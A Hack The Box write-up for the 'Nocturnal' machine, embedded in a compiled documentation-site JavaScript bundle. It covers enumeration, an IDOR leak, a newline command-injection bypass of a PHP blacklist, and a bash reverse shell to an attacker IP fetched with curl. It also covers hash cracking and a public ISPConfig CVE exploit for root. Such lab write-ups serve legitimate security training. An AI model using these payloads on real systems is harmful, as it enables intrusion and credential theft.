"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[6076],{4303:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/Machines/easy/Nocturnal","title":"Nocturnal","description":"Enumeration","source":"@site/docs/Hacking/Write-ups/Hack the box/Machines/easy/Nocturnal.md","sourceDirName":"Hacking/Write-ups/Hack the box/Machines/easy","slug":"/write-up/htb/machines/easy/nocturnal","permalink":"/docs/write-up/htb/machines/easy/nocturnal","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/machines/easy/nocturnal","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var a=t(4848),i=t(8453);const o={slug:"/write-up/htb/machines/easy/nocturnal",pagination_next:null,pagination_prev:null},r="Nocturnal",c={},l=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Lateral movement",id:"lateral-movement",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function h(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"nocturnal",children:"Nocturnal"})}),"\n",(0,a.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,a.jsx)(n.p,{children:"nmap:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ nmap 10.10.11.64\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 20:56 CEST\nNmap scan report for 10.10.11.64\nHost is up (0.039s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 10.06 seconds\n"})}),"\n",(0,a.jsx)(n.p,{children:"Whatweb:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"whatweb nocturnal.htb                                                                                        \nhttp://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0]\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Discovering folders with fuff, we found that ",(0,a.jsx)(n.code,{children:"nginx"})," is returning 403 or 301 for the following folders:"]}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"backups"}),"\n",(0,a.jsx)(n.li,{children:"uploads"}),"\n",(0,a.jsx)(n.li,{children:"uploads2"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"This might be useful for later."}),"\n",(0,a.jsxs)(n.p,{children:["In the website we see: ",(0,a.jsx)(n.code,{children:"Please login or register to start uploading and viewing your files."})]}),"\n",(0,a.jsxs)(n.p,{children:["When you upload a file, you can see the URL is ",(0,a.jsx)(n.a,{href:"http://nocturnal.htb/view.php?username=test%40test.htb&file=test.pdf",children:"http://nocturnal.htb/view.php?username=test%40test.htb&file=test.pdf"})]}),"\n",(0,a.jsx)(n.p,{children:"We can try to abuse this to list files."}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed."})}),"\n",(0,a.jsx)(n.p,{children:"If you register two users and upload different files, and you try to access same file from both accounts, you will discover that, i you send a valid username but invalid file, you'll get a list of the files uploaded for that username, e.g:"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"http://nocturnal.htb/view.php?username=test@test.htb&file=test2.pdf",children:"http://nocturnal.htb/view.php?username=test@test.htb&file=test2.pdf"})}),"\n",(0,a.jsxs)(n.p,{children:["So, we need a way of enumerating users. We can enumerate users with ",(0,a.jsx)(n.code,{children:"fuff"})," and ",(0,a.jsx)(n.code,{children:"SecLists"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'ffuf -w /opt/github/SecLists/Usernames/Names/names.txt:FUFF -u "http://nocturnal.htb/view.php?username=FUFF&file=test.pdf" -H "Cookie: PHPSESSID=xxx" -fw 1170\n'})}),"\n",(0,a.jsx)(n.p,{children:"Take into account that we need to be authenticated to perform the IDOR (Insecure Direct Object Reference) attack. To simulate authentication, we can pass a cookie to fuff. The following users have been found:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms]\namanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 33ms]\nkevin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms]\ntobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms]\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Amanda has a file named ",(0,a.jsx)(n.code,{children:"privacy.odt"}),". The password for amanda is in that file. Trying to ssh to the machine with amanda user and password failed; but we can access the website and have access to the admin panel."]}),"\n",(0,a.jsx)(n.h2,{id:"foothold",children:"Foothold"}),"\n",(0,a.jsxs)(n.p,{children:["Now we have access to the source code and we have a form to create and access backups. We see there are two folders: ",(0,a.jsx)(n.code,{children:"uploads"})," and ",(0,a.jsx)(n.code,{children:"backups"})," shown in the Admin panel. The admin panel only shows php files, but if we create a backup we'll have access to the uploads content."]}),"\n",(0,a.jsxs)(n.p,{children:["The URL format of the backup is ",(0,a.jsx)(n.code,{children:"http://nocturnal.htb/backups/backup_2025-08-17.zip"}),". We can try to bruteforce the backup folder and see if we find something interesting. Nothing found ..."]}),"\n",(0,a.jsx)(n.p,{children:"However, checking the code of the create backup function, a potential command injection is found via the password file"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:'$command = "zip -x \'./backups/*\' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";\n'})}),"\n",(0,a.jsx)(n.p,{children:"However, the password input is cleaned:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"function cleanEntry($entry) {\n    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];\n\n    foreach ($blacklist_chars as $char) {\n        if (strpos($entry, $char) !== false) {\n            return false; // Malicious input detected\n        }\n    }\n\n    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');\n}\n"})}),"\n",(0,a.jsx)(n.p,{children:"After messing around, I found a way to bypass the cleaning function: use newline character to execute different commands, e.g:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ls\nid\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Newline character is not cleaned up from the user input. Since we have access to the source code, we can prepare an experiment to see if we can bypass the limitation with ",(0,a.jsx)(n.code,{children:"\\n"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:'$entry="1\\nid>/tmp\\n";\n$password = cleanEntry($entry);\n'})}),"\n",(0,a.jsxs)(n.p,{children:["Since we want to retrieve the output of the ",(0,a.jsx)(n.code,{children:"id"})," command, we need to force an error. In the legitimate command, stdout and stderr are redirected to a log:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:'$command = "zip -x \'./backups/*\' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";\n'})}),"\n",(0,a.jsx)(n.p,{children:"The only thing now missing is testing it via the UI. However, due to the nature of the HTML components, looks like the password is not sent to the PHP endpoint as we want. Instead, we can rely to manual execution with curl."}),"\n",(0,a.jsxs)(n.p,{children:["If we try to send ",(0,a.jsx)(n.code,{children:"\\n"})," char our command injection will fail, however, we can send the url-encoded version of the payload:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"password=1%0Aid>/tmp%0A&backup=\n"})}),"\n",(0,a.jsxs)(n.p,{children:["In the same way, we can leverage ",(0,a.jsx)(n.code,{children:"\\t"})," instead of ",(0,a.jsx)(n.code,{children:" "}),"."]}),"\n",(0,a.jsx)(n.p,{children:"And we will see the contents of the id command in the returned logs."}),"\n",(0,a.jsx)(n.p,{children:"Now, we can try to create a reverse shell abusing of this RCE. Since there are a lot of restrictions on the command injection, we'll build the reverse shell payload locally and upload it to the target."}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsx)(n.li,{children:"Go to revshells.com"}),"\n",(0,a.jsx)(n.li,{children:"Write the reverse shell to a file in the attacker machine"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo 'bash -c \"bash -i >& /dev/tcp/10.10.14.173/9001 0>&1\"' > payload\n"})}),"\n",(0,a.jsxs)(n.ol,{start:"3",children:["\n",(0,a.jsx)(n.li,{children:"Download the payload in the victim machine. Pass the command injection with a payload that will execute:"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"curl 10.10.14.173:8000/shell -o payload\n"})}),"\n",(0,a.jsx)(n.p,{children:"This will download the payload to same directory\n4. Check if the payload has been downloaded:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ls -l payload\n"})}),"\n",(0,a.jsxs)(n.ol,{start:"5",children:["\n",(0,a.jsx)(n.li,{children:"Execute the payload:"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"bash payload\n"})}),"\n",(0,a.jsxs)(n.p,{children:["And we'll have a very nice shell into the machine with user ",(0,a.jsx)(n.code,{children:"www-data"}),"."]}),"\n",(0,a.jsx)(n.h2,{id:"lateral-movement",children:"Lateral movement"}),"\n",(0,a.jsx)(n.p,{children:"An SQLite database is found with www-data ownership. Let's exfiltrate it."}),"\n",(0,a.jsx)(n.p,{children:"In the database there's a bunch of users/hashes. According to hashcat, they are md4 hashes."}),"\n",(0,a.jsx)(n.p,{children:"Let's crack them:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n"})}),"\n",(0,a.jsxs)(n.p,{children:["And we find the password for user ",(0,a.jsx)(n.code,{children:"tobias"}),"."]}),"\n",(0,a.jsx)(n.p,{children:"We can now connect and retrieve the user flag."}),"\n",(0,a.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,a.jsx)(n.p,{children:"There's a bunch of application listening in localhost:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"tobias@nocturnal:~$ netstat -putona\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer\ntcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)\ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)\ntcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)\ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)\ntcp6       0      0 :::22                   :::*                    LISTEN      -                    off (0.00/0/0)\nudp        0      0 127.0.0.53:53           0.0.0.0:*                           -                    off (0.00/0/0)\n"})}),"\n",(0,a.jsxs)(n.p,{children:["In port 8080, it's something called ISPConfig. More info here: ",(0,a.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/ISPConfig",children:"https://en.wikipedia.org/wiki/ISPConfig"})]}),"\n",(0,a.jsx)(n.p,{children:"Tried a SSH port forwarding the application complained about a possible attack. Most likely, there's something that checks the hostname. We can modify /etc/hosts in our attacker machine to tell that nocturnal.htb now points to localhost."}),"\n",(0,a.jsx)(n.p,{children:"We can log in as admin - the password cracked for tobias."}),"\n",(0,a.jsx)(n.p,{children:"Trying to determine the version of the running ISPConfig."}),"\n",(0,a.jsx)(n.p,{children:"Come across some vulnerabilities:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"https://github.com/ajdumanhug/CVE-2023-46818",children:"https://github.com/ajdumanhug/CVE-2023-46818"})}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["It will exploit versions of ISPConfig ",(0,a.jsx)(n.code,{children:"<= 3.2.11"})," and we've got ISPConfig Version: 3.2.10p1"]}),"\n",(0,a.jsx)(n.p,{children:"We are lucky, looks like it will be affected"}),"\n",(0,a.jsxs)(n.p,{children:["The poc will give us access to a ",(0,a.jsx)(n.code,{children:"ispconfig-shell"})," as root. Looks like we cannot escape current directory, but, we can run a reverse shell from there that will give us full root access and we will be able to retrieve the flag."]})]})}function d(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(h,{...e})}):h(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>r});var s=t(6540);const a={},i=s.createContext(a);function o(e){const n=s.useContext(i);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:o(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);